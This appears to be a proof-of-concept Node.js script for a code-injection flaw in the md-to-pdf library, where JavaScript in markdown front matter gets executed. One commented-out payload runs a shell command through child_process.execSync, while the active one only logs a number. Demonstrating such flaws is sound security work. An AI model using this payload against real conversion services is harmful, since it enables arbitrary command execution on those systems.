const { mdToPdf } = require('md-to-pdf');

 // var payload = '---js\n((require("child_process")).execSync("id > RCE"))\n---RCE';
// var payload = '---js\n(ppppppppppppppooooooooooooooocccccccccccccccc)\n---RCE';
var payload = '---js\n((console.log(123)))\n---RCE';

(async () => {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
